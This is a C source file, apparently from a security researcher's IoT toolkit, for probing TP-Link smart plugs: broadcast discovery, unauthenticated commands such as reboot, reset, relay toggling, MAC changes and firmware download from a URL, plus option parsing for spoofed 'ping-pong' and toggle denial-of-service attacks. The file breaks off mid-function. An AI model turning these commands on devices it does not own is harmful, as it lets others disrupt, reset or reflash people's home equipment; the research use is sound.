/*
 * iot-tl-plug: A tool for playing with TP-Link Smart Plugs
 *
 * Copyright (C) 2017 Fernando Gont <fgont@si6networks.com>
 *
 * Programmed by Fernando Gont for SI6 Networks <https://www.si6networks.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * Build with: make iot-tl-plug
 *
 * It requires that the libpcap library be installed on your system.
 *
 * Please send any bug reports to Fernando Gont <fgont@si6networks.com>
 */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/time.h>
#include <sys/resource.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <net/if.h>
#include <netdb.h>
#include <pcap.h>

#include <errno.h>
#include <ctype.h>
#include <time.h>
#include <getopt.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <setjmp.h>
#include <unistd.h>

#include "iot-tl-plug.h"
#include "iot-toolkit.h"
#include "libiot.h"


/* Function prototypes */
void				free_host_entries(struct host_list *);
int					host_scan_local(pcap_t *, struct iface_data *, struct in6_addr *, unsigned char, \
									struct host_entry *);
void				print_help(void);
int					print_host_entries(struct host_list *, unsigned char);
void				usage(void);


/* Used for multiscan */
struct host_list			host_local, host_global, host_candidate;
struct host_entry			*host_locals[MAX_IPV6_ENTRIES], *host_globals[MAX_IPV6_ENTRIES];
struct host_entry			*host_candidates[MAX_IPV6_ENTRIES];

/* Used for router discovery */
struct iface_data			idata;

bpf_u_int32				my_netmask;
bpf_u_int32				my_ip;
struct bpf_program		pcap_filter;
char 					dev[64], errbuf[PCAP_ERRBUF_SIZE];
unsigned char			buffer[BUFFER_SIZE], buffrh[MIN_IPV6_HLEN + MIN_TCP_HLEN];
char			readbuff[BUFFER_SIZE], sendbuff[BUFFER_SIZE];
ssize_t					nreadbuff, nsendbuff;
char					line[LINE_BUFFER_SIZE];

  
struct ether_header		*ethernet;
unsigned int			ndst=0;

char					*lasts, *rpref;
char					*charptr;

size_t					nw;
unsigned long			ul_res, ul_val;
unsigned int			i, j, startrand;
unsigned int			skip;
unsigned char			dstpreflen;

uint16_t				mask;

char 					plinkaddr[ETHER_ADDR_PLEN], pv4addr[INET_ADDRSTRLEN];
char 					pv6addr[INET6_ADDRSTRLEN];
unsigned char 			verbose_f=FALSE, json_f=FALSE, command_f=FALSE;
unsigned char 			dstaddr_f=FALSE, timestamps_f=FALSE, scan_f= FALSE, local_f=FALSE, proto_f=FALSE;
unsigned char			dos_pingpong_f=FALSE, dos_toggle_f=FALSE, delay_f=FALSE, attack_length_f=FALSE;
unsigned long int		delay, attack_length;
char					*setptr;
unsigned int			nsetptr;
char					set= SET_RELAY_ON;
unsigned char			proto;

unsigned char			dst_f=FALSE, end_f=FALSE, endpscan_f=FALSE;
unsigned char			donesending_f=FALSE;
uint16_t				srcport, dstport;
unsigned long			pktinterval, rate;
unsigned int			packetsize;

struct prefixv4_entry	prefix;

char					*charstart, *charend, *lastcolon;
unsigned int			nsleep;
int						sel;
fd_set					sset, rset, wset, eset;
struct timeval			curtime, pcurtime, lastprobe, starttime;
struct tm				pcurtimetm;
unsigned int			retrans=0;

char *command, *arg1, *arg2;



int main(int argc, char **argv){
	extern char				*optarg;
	int						r;
	struct addrinfo			hints, *res, *aiptr;
	struct target_ipv6		target;
	struct timeval			timeout;
	void					*voidptr;
	const int				on=1;
	struct sockaddr_in		sockaddr_in, sockaddr_from, sockaddr_to;
	socklen_t				sockaddrfrom_len;
	struct json				*json1, *json2, *json3;
	struct json_value		json_value;
	char					*json, *command, *alias, *dev_name, *type, *model;
	struct pseudohdr 		*pseudohdr;
	struct udp_hdr 			*udp_hdr;
	struct ip_hdr			*ip_hdr;
	ssize_t					nbytes;
	uint32_t				datalen;

	static struct option longopts[] = {
		{"interface", required_argument, 0, 'i'},
		{"command", required_argument, 0, 'c'},		
		{"json", required_argument, 0, 'j'},
		{"protocol", required_argument, 0, 'P'},
		{"ping-pong", required_argument, 0, 'p'},
		{"toggle", required_argument, 0, 'T'},
		{"src-address", required_argument, 0, 's'},
		{"dst-address", required_argument, 0, 'd'},
		{"src-port", required_argument, 0, 'o'},
		{"dst-port", required_argument, 0, 'a'},
		{"local", no_argument, 0, 'L'},
		{"retrans", required_argument, 0, 'x'},
		{"scan", no_argument, 0, 'Z'},
		{"timeout", required_argument, 0, 'O'},
		{"verbose", no_argument, 0, 'v'},
		{"help", no_argument, 0, 'h'},
		{0, 0, 0,  0 }
	};

	char shortopts[]= "i:c:j:P:p:T:o:a:s:d:Lx:O:Zvh";

	char option;

	if(argc<=1){
		usage();
		exit(EXIT_FAILURE);
	}

	srandom(time(NULL));

	init_iface_data(&idata);


	while((r=getopt_long(argc, argv, shortopts, longopts, NULL)) != -1) {
		option= r;

		switch(option) {
			case 'i':  /* Interface */
				strncpy(idata.iface, optarg, IFACE_LENGTH-1);
				idata.iface[IFACE_LENGTH-1]=0;
				idata.ifindex= if_nametoindex(idata.iface);
				idata.iface_f=TRUE;
				break;

			case 'j':  /* json */
				json= optarg;
				json_f=TRUE;
				break;

			case 's':	/* Source Address */
				/* The '-s' option contains a domain name */
				if((charptr = strtok_r(optarg, "/", &lasts)) == NULL){
					puts("Error in Destination Address");
					exit(EXIT_FAILURE);
				}

				strncpy(target.name, charptr, NI_MAXHOST);
				target.name[NI_MAXHOST-1]=0;

				if((charptr = strtok_r(NULL, " ", &lasts)) != NULL){
					prefix.len = atoi(charptr);
		
					if(prefix.len > 32){
						puts("Prefix length error in IP Destination Address");
						exit(EXIT_FAILURE);
					}
				}
				else{
					prefix.len= 32;
				}

				memset(&hints, 0, sizeof(hints));
				hints.ai_family= AF_INET;
				hints.ai_canonname = NULL;
				hints.ai_addr = NULL;
				hints.ai_next = NULL;
				hints.ai_socktype= SOCK_DGRAM;

				if( (target.res = getaddrinfo(target.name, NULL, &hints, &res)) != 0){
					printf("Unknown Destination '%s': %s\n", target.name, gai_strerror(target.res));
					exit(EXIT_FAILURE);
				}

				for(aiptr=res; aiptr != NULL; aiptr=aiptr->ai_next){
					if(aiptr->ai_family != AF_INET)
							continue;

					if(aiptr->ai_addrlen != sizeof(struct sockaddr_in))
						continue;

					if(aiptr->ai_addr == NULL)
						continue;

					prefix.ip= ( (struct sockaddr_in *)aiptr->ai_addr)->sin_addr;
				}

				freeaddrinfo(res);

				idata.srcaddr= prefix.ip;				
				idata.srcaddr_f= TRUE;
				break;

			case 'd':	/* Destination Address */
				/* The '-d' option contains a domain name */
				if((charptr = strtok_r(optarg, "/", &lasts)) == NULL){
					puts("Error in Destination Address");
					exit(EXIT_FAILURE);
				}

				strncpy(target.name, charptr, NI_MAXHOST);
				target.name[NI_MAXHOST-1]=0;

				if((charptr = strtok_r(NULL, " ", &lasts)) != NULL){
					prefix.len = atoi(charptr);
		
					if(prefix.len > 32){
						puts("Prefix length error in IP Destination Address");
						exit(EXIT_FAILURE);
					}
				}
				else{
					prefix.len= 32;
				}

				memset(&hints, 0, sizeof(hints));
				hints.ai_family= AF_INET;
				hints.ai_canonname = NULL;
				hints.ai_addr = NULL;
				hints.ai_next = NULL;
				hints.ai_socktype= SOCK_DGRAM;

				if( (target.res = getaddrinfo(target.name, NULL, &hints, &res)) != 0){
					printf("Unknown Destination '%s': %s\n", target.name, gai_strerror(target.res));
					exit(EXIT_FAILURE);
				}

				for(aiptr=res; aiptr != NULL; aiptr=aiptr->ai_next){
					if(aiptr->ai_family != AF_INET)
							continue;

					if(aiptr->ai_addrlen != sizeof(struct sockaddr_in))
						continue;

					if(aiptr->ai_addr == NULL)
						continue;

					prefix.ip= ( (struct sockaddr_in *)aiptr->ai_addr)->sin_addr;
				}

				freeaddrinfo(res);

				idata.dstaddr= prefix.ip;				
				idata.dstaddr_f= TRUE;
				dst_f=TRUE;
				break;

			case 'P':	/* Ping Pong attack , src, dst, retrans, TIME*/
				dos_pingpong_f=TRUE;

				if((charptr = strtok_r(optarg, "#", &lasts)) != NULL){
						strncpy(target.name, charptr, NI_MAXHOST);
						target.name[NI_MAXHOST-1]=0;

						memset(&hints, 0, sizeof(hints));
						hints.ai_family= AF_INET;
						hints.ai_canonname = NULL;
						hints.ai_addr = NULL;
						hints.ai_next = NULL;
						hints.ai_socktype= SOCK_DGRAM;

						if( (target.res = getaddrinfo(target.name, NULL, &hints, &res)) != 0){
							printf("Unknown Destination '%s': %s\n", target.name, gai_strerror(target.res));
							exit(EXIT_FAILURE);
						}

						for(aiptr=res; aiptr != NULL; aiptr=aiptr->ai_next){
							if(aiptr->ai_family != AF_INET)
									continue;

							if(aiptr->ai_addrlen != sizeof(struct sockaddr_in))
								continue;

							if(aiptr->ai_addr == NULL)
								continue;

							idata.srcaddr= ( (struct sockaddr_in *)aiptr->ai_addr)->sin_addr;
							idata.srcaddr_f= TRUE;
							break;
						}

						freeaddrinfo(res);


						if((charptr = strtok_r(NULL, "#", &lasts)) != NULL){
							strncpy(target.name, charptr, NI_MAXHOST);
							target.name[NI_MAXHOST-1]=0;

							memset(&hints, 0, sizeof(hints));
							hints.ai_family= AF_INET;
							hints.ai_canonname = NULL;
							hints.ai_addr = NULL;
							hints.ai_next = NULL;
							hints.ai_socktype= SOCK_DGRAM;

							if( (target.res = getaddrinfo(target.name, NULL, &hints, &res)) != 0){
								printf("Unknown Destination '%s': %s\n", target.name, gai_strerror(target.res));
								exit(EXIT_FAILURE);
							}

							for(aiptr=res; aiptr != NULL; aiptr=aiptr->ai_next){
								if(aiptr->ai_family != AF_INET)
										continue;

								if(aiptr->ai_addrlen != sizeof(struct sockaddr_in))
									continue;

								if(aiptr->ai_addr == NULL)
									continue;

								idata.dstaddr= ( (struct sockaddr_in *)aiptr->ai_addr)->sin_addr;
								idata.dstaddr_f= TRUE;
								break;
							}

							freeaddrinfo(res);


							if((charptr = strtok_r(NULL, "#", &lasts)) != NULL){
								delay= atoi(charptr);
								delay_f=TRUE;

								if((charptr = strtok_r(NULL, "#", &lasts)) != NULL){
									attack_length= atoi(charptr);
									attack_length_f=TRUE;
								}
							}
						}

				}
				else{
					puts("Must specify target for ping-pong attack");
					exit(EXIT_FAILURE);
				}

				if(!delay_f)
					delay= 100;

				if(!idata.dstaddr_f){
					if ( inet_pton(AF_INET, IP_LIMITED_MULTICAST, &(idata.dstaddr)) <= 0){
						puts("inet_pton(): Error setting multicast address");
						exit(EXIT_FAILURE);
					}

					idata.dstaddr_f=TRUE;
				}

				break;

	
			case 'p':	/* Toggle DST, retrans, TIME */
				proto_f=TRUE;

				if( strncmp(optarg, "tcp", MAX_STRING_SIZE) == 0 || strncmp(optarg, "TCP", MAX_STRING_SIZE) == 0)
					proto= IPPROTO_TCP;
				else if( strncmp(optarg, "udp", MAX_STRING_SIZE) == 0 || strncmp(optarg, "UDP", MAX_STRING_SIZE) == 0)
					proto= IPPROTO_UDP;
				else{
					puts("Invalid transport protocol");
					exit(EXIT_FAILURE);
				}

				break;


			case 'T':	/* Toggle DST, retrans, TIME */
				dos_toggle_f=TRUE;

				if((charptr = strtok_r(optarg, "#", &lasts)) != NULL){
					strncpy(target.name, charptr, NI_MAXHOST);
					target.name[NI_MAXHOST-1]=0;

					memset(&hints, 0, sizeof(hints));
					hints.ai_family= AF_INET;
					hints.ai_canonname = NULL;
					hints.ai_addr = NULL;
					hints.ai_next = NULL;
					hints.ai_socktype= SOCK_DGRAM;

					if( (target.res = getaddrinfo(target.name, NULL, &hints, &res)) != 0){
						printf("Unknown Destination '%s': %s\n", target.name, gai_strerror(target.res));
						exit(EXIT_FAILURE);
					}

					for(aiptr=res; aiptr != NULL; aiptr=aiptr->ai_next){
						if(aiptr->ai_family != AF_INET)
								continue;

						if(aiptr->ai_addrlen != sizeof(struct sockaddr_in))
							continue;

						if(aiptr->ai_addr == NULL)
							continue;

						idata.dstaddr= ( (struct sockaddr_in *)aiptr->ai_addr)->sin_addr;
						idata.dstaddr_f= TRUE;
						break;
					}

					freeaddrinfo(res);


					if((charptr = strtok_r(NULL, "#", &lasts)) != NULL){
						delay= atoi(charptr);
						delay_f=TRUE;

						if((charptr = strtok_r(NULL, "#", &lasts)) != NULL){
							attack_length= atoi(charptr);
							attack_length_f=TRUE;
						}
					}
				}
				else{
					puts("Must specify target for ping-pong attack");
					exit(EXIT_FAILURE);
				}

				if(!delay_f)
					delay= 100;

				if(!idata.dstaddr_f){
					if ( inet_pton(AF_INET, IP_LIMITED_MULTICAST, &(idata.dstaddr)) <= 0){
						puts("inet_pton(): Error setting multicast address");
						exit(EXIT_FAILURE);
					}

					idata.dstaddr_f=TRUE;
				}

				break;


			case 'c':  /* Command */
				command_f=TRUE;

				if((command = strtok_r(optarg, "#", &lasts)) != NULL){
					if(strncmp(command, "download_firmware", MAX_TP_COMMAND_LENGTH) != 0){
						if((arg1 = strtok_r(NULL, "#", &lasts)) != NULL){
							if((arg2 = strtok_r(NULL, "#", &lasts)) != NULL){

							}
						}
					}
				}

				if(command != NULL){
					printf("Command: #%s#\n", command);
				}
				if(arg1 != NULL){
					printf("arg1: #%s#\n", arg1);
				}
				if(arg2 != NULL){
					printf("arg2: #%s#\n", arg2);
				}

				if(command == NULL || !is_command_valid(command)){
					puts("Invalid command");
					exit(EXIT_FAILURE);
				}

				command_f=TRUE;
				break;

			case 'o':	/* UDP Source Port */
				idata.srcport= atoi(optarg);
				idata.srcport_f= 1;
				break;

			case 'a':	/* UDP Destination Port */
				idata.dstport= atoi(optarg);
				idata.dstport_f= 1;
				break;

			case 'L':
				local_f=TRUE;
				break;

			case 'x':
				idata.local_retrans=atoi(optarg);
				break;

			case 'O':
				idata.local_timeout=atoi(optarg);
				break;

			case 'Z':	/* scan */
				scan_f= TRUE;
				break;

			case 'v':	/* Be verbose */
				idata.verbose_f++;
				break;
		
			case 'h':	/* Help */
				print_help();
				exit(EXIT_FAILURE);
				break;

			default:
				usage();
				exit(EXIT_FAILURE);
				break;
		
		} /* switch */
	} /* while(getopt) */


	/*
	    XXX: This is rather ugly, but some local functions need to check for verbosity, and it was not warranted
	    to pass &idata as an argument
	 */
	verbose_f= idata.verbose_f;

	if(dos_pingpong_f){
		if(geteuid()){
			puts("iot-tl-plug needs superuser privileges to run");
			exit(EXIT_FAILURE);
		}
	}
	else{
		release_privileges();
	}

		/* 
	if(local_f && !idata.iface_f){
XXX This should later allow to just specify local scan and automatically choose an interface 
		puts("Must specify the network interface with the -i option when a local scan is selected");
		exit(EXIT_FAILURE);
	}
*/

/* puts("check si deberia especificar interfaz"); */

/*
	if(!dst_f && !local_f){
			puts("Must specify either a destination ('-d'), or a local ('-L')");

		exit(EXIT_FAILURE);
	}
*/
/*
	release_privileges();
*/


	if(get_local_addrs(&idata) == FAILURE){
		puts("Error obtaining list of local interfaces and addresses");
		exit(EXIT_FAILURE);
	}

	if(scan_f){
		host_local.nhosts=0;
		host_local.maxhosts= MAX_IPV6_ENTRIES;
		host_local.host= host_locals;


		if(! idata.srcaddr_f){
		/* If an interface was specified, we select an IPv4 address from such interface */
			if(idata.iface_f){
				if( (voidptr=find_v4addr_for_iface(&(idata.iflist), idata.iface)) == NULL){
					printf("No IPv4 address for interface %s\n", idata.iface);
					exit(EXIT_FAILURE);
				}

				idata.srcaddr= *((struct in_addr *) voidptr);
			}
			else{
				if( (voidptr=find_v4addr(&(idata.iflist))) == NULL){
					puts("No IPv4 address available on local host");
					exit(EXIT_FAILURE);
				}

				idata.srcaddr= *((struct in_addr *)voidptr);
			}
		}

		if( (idata.fd=socket(AF_INET, SOCK_DGRAM, 0)) == -1){
			puts("Could not create socket");
			exit(EXIT_FAILURE);
		}

		if( setsockopt(idata.fd, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) == -1){
			puts("Error while setting SO_BROADCAST socket option");
			exit(EXIT_FAILURE);
		}

		memset(&sockaddr_in, 0, sizeof(sockaddr_in));
		sockaddr_in.sin_family= AF_INET;
		sockaddr_in.sin_addr= idata.srcaddr;

		if(idata.srcport_f){
			sockaddr_in.sin_port= htons(idata.srcport);
		}
		else{
			sockaddr_in.sin_port= 0;  /* Allow Sockets API to set an ephemeral port */
		}

		if(bind(idata.fd, (struct sockaddr *) &sockaddr_in, sizeof(sockaddr_in)) == -1){
			puts("Error bind()ing socket to local address");
			exit(EXIT_FAILURE);
		}

		memset(&sockaddr_to, 0, sizeof(sockaddr_to));
		sockaddr_to.sin_family= AF_INET;

		if(idata.dstport_f){
			sockaddr_to.sin_port= htons(idata.dstport);
		}
		else{
			sockaddr_to.sin_port= htons(TP_LINK_SMART_PORT);
			idata.dstport= TP_LINK_SMART_PORT;
		}

		memset(&sockaddr_from, 0, sizeof(sockaddr_from));
		sockaddr_from.sin_family= AF_INET;
		sockaddrfrom_len=sizeof(sockaddr_from);


		if(!idata.dstaddr_f){
			if ( inet_pton(AF_INET, IP_LIMITED_MULTICAST, &(sockaddr_to.sin_addr)) <= 0){
				puts("inet_pton(): Error setting multicast address");
				exit(EXIT_FAILURE);
			}
		}
		else{
			sockaddr_to.sin_addr= idata.dstaddr;
		}


		FD_ZERO(&sset);
		FD_SET(idata.fd, &sset);

		lastprobe.tv_sec= 0;	
		lastprobe.tv_usec=0;
		idata.pending_write_f=TRUE;	

		/* The end_f flag is set after the last probe has been sent and a timeout period has elapsed.
		   That is, we give responses enough time to come back
		 */
		while(!end_f){
			rset= sset;
			wset= sset;
			eset= sset;

			if(!donesending_f){
				/* This is the retransmission timer */
				timeout.tv_sec= 1;
				timeout.tv_usec= 0;
			}
			else{
				/* XXX: This should use the parameter from command line */
				timeout.tv_sec= idata.local_timeout;
				timeout.tv_usec=0;
			}

			/*
				Check for readability and exceptions. We only check for writeability if there is pending data
				to send.
			 */
			if((sel=select(idata.fd+1, &rset, (idata.pending_write_f?&wset:NULL), &eset, &timeout)) == -1){
				if(errno == EINTR){
					continue;
				}
				else{
					perror("iot-tl-plug:");
					exit(EXIT_FAILURE);
				}
			}

			if(gettimeofday(&curtime, NULL) == -1){
				if(idata.verbose_f)
					perror("iot-tl-plug");

				exit(EXIT_FAILURE);
			}

			/* Check whether we have finished probing all targets */
			if(donesending_f){
				/*
				   Just wait for SELECT_TIMEOUT seconds for any incoming responses.
				*/

				if(is_time_elapsed(&curtime, &lastprobe, idata.local_timeout * 1000000)){
					end_f=TRUE;
				}
			}


			if(sel && FD_ISSET(idata.fd, &rset)){
				/* XXX: Process response packet */

				if( (nreadbuff = recvfrom(idata.fd, readbuff, sizeof(readbuff), 0, (struct sockaddr *)&sockaddr_from, &sockaddrfrom_len)) == -1){
					perror("iot-tl-plug: ");
					exit(EXIT_FAILURE);
				}

				if(inet_ntop(AF_INET, &(sockaddr_from.sin_addr), pv4addr, sizeof(pv4addr)) == NULL){
					perror("iot-tl-plug: ");
					exit(EXIT_FAILURE);
				}

/*				printf("Got response from: %s, port %u\n", pv4addr, ntohs(sockaddr_from.sin_port));*/
				tp_link_decrypt((unsigned char *)readbuff, nreadbuff);

				alias=NULL;
				dev_name=NULL;
				type=NULL;
				model=NULL;

				/* Get to system:get_sysinfo */
				if( (json1=json_get_objects(readbuff, (nreadbuff))) != NULL){
					if( json_get_value(json1, &json_value, "\"system\"")){
						if( (json2=json_get_objects(json_value.value, json_value.len)) != NULL){
							if( json_get_value(json2, &json_value, "\"get_sysinfo\"")){
								if( (json3=json_get_objects(json_value.value, json_value.len)) != NULL){
									json_remove_quotes(json3);
									if( json_get_value(json3, &json_value, "type")){
										type=json_value.value;
									}
									if( json_get_value(json3, &json_value, "model")){
										model=json_value.value;
									}
									if( json_get_value(json3, &json_value, "dev_name")){
										dev_name=json_value.value;
									}
									if( json_get_value(json3, &json_value, "alias")){
										alias=json_value.value;
									}	

									printf("%s: \"%s\" (\"%s\": %s %s)\n", pv4addr, alias, dev_name, type, model);
			
								}
							}
						}
					}
				}
			}


			if(!donesending_f && !idata.pending_write_f && is_time_elapsed(&curtime, &lastprobe, 1 * 1000000)){
				idata.pending_write_f=TRUE;
				continue;
			}

			if(!donesending_f && idata.pending_write_f && FD_ISSET(idata.fd, &wset)){
				idata.pending_write_f=FALSE;

				/* XXX: SEND PROBE PACKET */
				nsendbuff= Strnlen(TP_LINK_SMART_DISCOVER, MAX_TP_COMMAND_LENGTH);
				memcpy(sendbuff, TP_LINK_SMART_DISCOVER, nsendbuff);

				if( sendto(idata.fd, sendbuff, nsendbuff, 0, (struct sockaddr *) &sockaddr_to, sizeof(sockaddr_to)) == -1){
					perror("iot-tl-plug: ");
					exit(EXIT_FAILURE);
				}

				if(gettimeofday(&lastprobe, NULL) == -1){
					if(idata.verbose_f)
						perror("iot-tl-plug");

					exit(EXIT_FAILURE);
				}

				retrans++;

				if(retrans >= idata.local_retrans)
					donesending_f= 1;

			}


			if(FD_ISSET(idata.fd, &eset)){
				if(idata.verbose_f)
					puts("iot-tl-plug: Found exception on descriptor");

				exit(EXIT_FAILURE);
			}
		}

		exit(EXIT_SUCCESS);
	}
	else if(command_f && proto_f && proto == IPPROTO_TCP){
		if(strncmp(command, "get_info", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"get_sysinfo\":null},\"emeter\":{\"get_realtime\":null}}");
		}
		else if(strncmp(command, "get_sys_info", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"get_sysinfo\":null}}");
		}
		else if(strncmp(command, "get_emeter_info", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"emeter\":{\"get_realtime\":null}}");
		}
		else if(strncmp(command, "reboot", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"reboot\":{\"delay\":%s}}}", arg1?arg1:"1");
		}
		else if(strncmp(command, "reset", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"reset\":{\"delay\":%s}}}", arg1?arg1:"1");
		}
		else if(strncmp(command, "set_relay_state", MAX_TP_COMMAND_LENGTH) == 0){
			if(arg1 == NULL || strncmp(arg1, "1", MAX_TP_COMMAND_LENGTH) == 0 || strncmp(arg1, "on", MAX_TP_COMMAND_LENGTH) ==0)
				snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_relay_state\":{\"state\":1}}}");
			else if(strncmp(arg1, "0", MAX_TP_COMMAND_LENGTH) == 0 || strncmp(arg1, "off", MAX_TP_COMMAND_LENGTH) == 0)
				snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_relay_state\":{\"state\":0}}}");
			else{

				puts("Unknown relay state");
				exit(EXIT_FAILURE);
			}
		}
		else if(strncmp(command, "set_led_off", MAX_TP_COMMAND_LENGTH) == 0){
			if(arg1 == NULL || strncmp(arg1, "1", MAX_TP_COMMAND_LENGTH) ==0)
				snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_led_off\":{\"off\":1}}}");
			else if(strncmp(arg1, "0", MAX_TP_COMMAND_LENGTH) == 0 || strncmp(arg1, "off", MAX_TP_COMMAND_LENGTH) == 0)
				snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_led_off\":{\"off\":0}}}");
			else{
				puts("Invalid set_led_off parameter");
				exit(EXIT_FAILURE);
			}
		}
		else if(strncmp(command, "set_dev_alias", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_dev_alias\":{\"alias\":\"%s\"}}}", arg1?arg1:"");
		}
		else if(strncmp(command, "set_mac_addr", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_mac_addr\":{\"mac\":\"%s\"}}}", arg1?arg1:"");
		}
		else if(strncmp(command, "set_device_id", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_device_id\":{\"deviceId\":\"%s\"}}}", arg1?arg1:"");
		}
		else if(strncmp(command, "set_hw_id", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_hw_id\":{\"hwId\":\"%s\"}}}", arg1?arg1:"");
		}
		else if(strncmp(command, "set_dev_location", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_dev_location\":{\"longitude\":%s,\"latitude\":%s}}}", arg1?arg1:"0",arg2?arg2:"0");
		}
		else if(strncmp(command, "test_check_uboot", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"test_check_uboot\":null}}");
		}
		else if(strncmp(command, "get_dev_icon", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"get_dev_icon\":null}}");
		}
		else if(strncmp(command, "set_dev_icon", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_dev_icon\":{\"icon\":\"%s\",\"hash\":\"%s\"}}}", arg1?arg1:"", arg2?arg2:"");
		}
		else if(strncmp(command, "set_test_mode", MAX_TP_COMMAND_LENGTH) == 0){
			if(arg1 == NULL || strncmp(arg1, "1", MAX_TP_COMMAND_LENGTH) == 0 || strncmp(arg1, "on", MAX_TP_COMMAND_LENGTH) == 0)
				snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_test_mode\":{\"enable\":1}}}");
			else if(arg1 && (strncmp(arg1, "0", MAX_TP_COMMAND_LENGTH) == 0 || strncmp(arg1, "ff", MAX_TP_COMMAND_LENGTH) == 0))
				snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"set_test_mode\":{\"enable\":0}}}");
			else{
				puts("Invalid option for test mode");
				exit(EXIT_FAILURE);
			}
		}
		else if(strncmp(command, "download_firmware", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"download_firmware\":{\"url\":\"%s\"}}}", arg1?arg1:"");
		}
		else if(strncmp(command, "get_download_state", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"get_download_state\":{}}}");
		}
		else if(strncmp(command, "flash_firmware", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"flash_firmware\":{}}}");
		}
		else if(strncmp(command, "check_new_config", MAX_TP_COMMAND_LENGTH) == 0){
			snprintf(sendbuff, sizeof(sendbuff), "{\"system\":{\"check_new_config\":{}}}");
		}

		/* XXX: SEND PROBE PACKET */
		nsendbuff= Strnlen(sendbuff, MAX_TP_COMMAND_LENGTH);
		printf("Comando sin encriptar: \n#%s#\n\n", sendbuff);
		tp_link_crypt((unsigned char *)sendbuff, nsendbuff);


		/* If an interface was specified, we select an IPv4 address from such interface */
		if(idata.iface_f){
			if( (voidptr=find_v4addr_for_iface(&(idata.iflist), idata.iface)) == NULL){
				printf("No IPv4 address for interface %s\n", idata.iface);
				exit(EXIT_FAILURE);
			}

			idata.srcaddr= *((struct in_addr *) voidptr);
		}
		else{
			if( (voidptr=find_v4addr(&(idata.iflist))) == NULL){
				puts("No IPv4 address available on local host");
				exit(EXIT_FAILURE);
			}

			idata.srcaddr= *((struct in_addr *)voidptr);
		}

		if( (idata.fd=socket(AF_INET, SOCK_STREAM, 0)) == -1){
			puts("Could not create socket");
			exit(EXIT_FAILURE);
		}

		memset(&sockaddr_in, 0, sizeof(sockaddr_in));
		sockaddr_in.sin_family= AF_INET;
		sockaddr_in.sin_port= 0;  /* Allow Sockets API to set an ephemeral port */
		sockaddr_in.sin_addr= idata.srcaddr;


		if(bind(idata.fd, (struct sockaddr *) &sockaddr_in, sizeof(sockaddr_in)) == -1){
			puts("Error bind()ing socket to local address");
			exit(EXIT_FAILURE);
		}

		memset(&sockaddr_to, 0, sizeof(sockaddr_to));
		sockaddr_to.sin_family= AF_INET;
		sockaddr_to.sin_port= htons(TP_LINK_SMART_PORT);

		if(idata.dstaddr_f){
			sockaddr_to.sin_addr= idata.dstaddr;
		}
		else{
			puts("Must specify destination address");
			exit(EXIT_FAILURE);
		}

		if( connect( idata.fd, (struct sockaddr *) &sockaddr_to, sizeof( sockaddr_to)) < 0) {
			perror( "connect error");
			exit(EXIT_FAILURE);
		}	

		datalen= htonl(nsendbuff);
		if(write(idata.fd, &datalen, sizeof(datalen)) <0){
			perror("iot-tl-plug:");
			exit(EXIT_FAILURE);
		}

		i=0;
		{
			if( (nbytes=write(idata.fd, sendbuff+i, nsendbuff-i)) < 0){
				perror("iot-tl-plug:");
				exit(EXIT_FAILURE);
			}

			i=i+nbytes;
		}while(i<nsendbuff);
		

		nreadbuff=0;
		while( nreadbuff < 4 && (nbytes=read(idata.fd, (readbuff+nreadbuff), 4-nreadbuff) ) > 0){
			nreadbuff= nreadbuff+nbytes;
		}

		datalen= ntohl(*((uint32_t *)readbuff));
		if(datalen >= sizeof(readbuff)){
			puts("Response is too large");
			exit(EXIT_FAILURE);
		}	

		nreadbuff=0;
		while( (nreadbuff< datalen) && (nbytes=read(idata.fd, (readbuff+nreadbuff), datalen-nreadbuff) ) > 0){
			nreadbuff= nreadbuff+nbytes;
		}

		if(nbytes < 0){
			perror("iot-tl-plug:");
